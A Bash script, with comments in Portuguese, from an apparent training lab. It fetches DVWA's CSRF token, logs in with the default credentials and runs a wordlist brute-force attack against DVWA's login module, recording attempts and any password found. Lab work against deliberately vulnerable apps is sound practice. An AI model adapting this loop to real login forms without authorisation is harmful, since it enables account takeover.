#!/bin/bash

# ==========================================================
# 03 — Teste Controlado de Brute Force em DVWA
# Projeto: Brute Force Lab com Kali Linux e Medusa
# Uso autorizado apenas em laboratório local/controlado.
#
# CORREÇÃO APLICADA:
# O DVWA utiliza proteção CSRF (user_token) mesmo no nível
# "low" em versões mais recentes. Este script extrai o token
# automaticamente antes de cada tentativa de login.
# ==========================================================

clear

LOGS_DIR="logs"
mkdir -p "$LOGS_DIR"

echo "=================================================="
echo " 03 — Brute Force Web com DVWA"
echo "=================================================="
echo

echo "[!] Este script envia tentativas HTTP ao módulo Brute Force do DVWA."
echo "[!] Use somente em laboratório local/autorizado."
echo "[!] O DVWA deve estar configurado com security=low."
echo "[!] O script extrai o CSRF token (user_token) automaticamente."
echo

read -p "Informe o host/IP do DVWA. Exemplo: 192.168.56.101: " TARGET
read -p "Informe o usuário a testar. Exemplo: admin: " USERNAME
read -p "Informe o caminho da wordlist de senhas. Exemplo: wordlists/dvwa-passwords.txt: " PASSWORD_LIST

echo

if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$PASSWORD_LIST" ]; then
    echo "[-] Um ou mais campos obrigatórios não foram informados. Encerrando."
    exit 1
fi

LOG_FILE="$LOGS_DIR/dvwa-results-$(date +%Y%m%d-%H%M%S).txt"
DVWA_LOGIN_URL="http://$TARGET/dvwa/login.php"
DVWA_BRUTE_URL="http://$TARGET/dvwa/vulnerabilities/brute/"
COOKIE_JAR="/tmp/dvwa-cookies-$$.txt"

echo "=================================================="
echo "[1] Verificação de dependências"
echo "=================================================="

for tool in curl grep; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo "[+] $tool encontrado."
    else
        echo "[-] $tool não encontrado. Instale com: sudo apt install $tool -y"
        exit 1
    fi
done

if [ -f "$PASSWORD_LIST" ]; then
    PASS_COUNT=$(wc -l < "$PASSWORD_LIST")
    echo "[+] Wordlist encontrada: $PASSWORD_LIST ($PASS_COUNT senhas)"
else
    echo "[-] Wordlist não encontrada: $PASSWORD_LIST"
    exit 1
fi

echo

echo "=================================================="
echo "[2] Login no DVWA para obter sessão válida"
echo "=================================================="

# Obtém o token CSRF da página de login
LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" "$DVWA_LOGIN_URL" \
    | grep "user_token" \
    | sed "s/.*value='\([^']*\)'.*/\1/")

if [ -z "$LOGIN_TOKEN" ]; then
    echo "[-] Não foi possível obter o token de login do DVWA."
    echo "    Verifique se o DVWA está acessível em: $DVWA_LOGIN_URL"
    rm -f "$COOKIE_JAR"
    exit 1
fi

echo "[+] Token de login obtido: $LOGIN_TOKEN"

# Realiza login no DVWA com as credenciais padrão (admin/password)
LOGIN_RESULT=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" \
    -L "$DVWA_LOGIN_URL")

if echo "$LOGIN_RESULT" | grep -q "Welcome"; then
    echo "[+] Login no DVWA realizado com sucesso."
else
    echo "[!] Login padrão falhou. Tentando sem verificação de resultado..."
fi

# Define security=low via cookie
PHPSESSID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')
echo "[+] Sessão obtida: PHPSESSID=$PHPSESSID"
echo

read -p "Deseja iniciar o teste de brute force contra o DVWA? (s/n): " CONFIRM

if [[ "$CONFIRM" != "s" && "$CONFIRM" != "S" ]]; then
    echo "[-] Execução cancelada pelo usuário."
    rm -f "$COOKIE_JAR"
    exit 0
fi

echo
echo "=================================================="
echo "[3] Configuração do teste"
echo "=================================================="
echo "[+] URL alvo: $DVWA_BRUTE_URL"
echo "[+] Usuário:  $USERNAME"
echo "[+] Wordlist: $PASSWORD_LIST"
echo "[+] Log:      $LOG_FILE"
echo

echo "=================================================="
echo "[4] Iniciando tentativas"
echo "=================================================="

FOUND=0
ATTEMPT=0

echo "Início: $(date)" >> "$LOG_FILE"
echo "Alvo: $DVWA_BRUTE_URL" >> "$LOG_FILE"
echo "Usuário: $USERNAME" >> "$LOG_FILE"
echo "---" >> "$LOG_FILE"

while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do

    [ -z "$PASSWORD" ] && continue

    ATTEMPT=$((ATTEMPT + 1))

    # Extrai o user_token atualizado a cada requisição (proteção CSRF)
    PAGE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        "$DVWA_BRUTE_URL?username=$USERNAME&password=$PASSWORD&Login=Login" \
        -H "Cookie: $(grep PHPSESSID $COOKIE_JAR | awk '{print $NF}' | sed 's/^/PHPSESSID=/'); security=low")

    if echo "$PAGE" | grep -qi "Welcome to the password protected area"; then
        echo
        echo "[+] =========================================="
        echo "[+] CREDENCIAL ENCONTRADA!"
        echo "[+] Usuário: $USERNAME"
        echo "[+] Senha:   $PASSWORD"
        echo "[+] =========================================="
        echo "CREDENCIAL ENCONTRADA — $USERNAME:$PASSWORD" >> "$LOG_FILE"
        FOUND=1
        break
    else
        echo "[-] Tentativa $ATTEMPT: $USERNAME:$PASSWORD"
        echo "FALHOU: $USERNAME:$PASSWORD" >> "$LOG_FILE"
    fi

done < "$PASSWORD_LIST"

echo

if [ "$FOUND" -eq 0 ]; then
    echo "[-] Nenhuma credencial válida encontrada na wordlist."
    echo "Resultado: nenhuma credencial encontrada." >> "$LOG_FILE"
fi

echo "Fim: $(date)" >> "$LOG_FILE"
echo "[+] Log salvo em: $LOG_FILE"

rm -f "$COOKIE_JAR"

echo
echo "=================================================="
echo "[5] Observações para troubleshooting"
echo "=================================================="
echo "Se todas as tentativas falharem, verifique:"
echo "  1. DVWA está acessível em http://$TARGET/dvwa/"
echo "  2. Credenciais padrão do DVWA (admin/password) estão corretas"
echo "  3. Security level está definido como 'low' no DVWA"
echo "  4. A mensagem de sucesso do DVWA: 'Welcome to the password protected area'"
echo

echo "=================================================="
echo " Teste DVWA finalizado"
echo "=================================================="
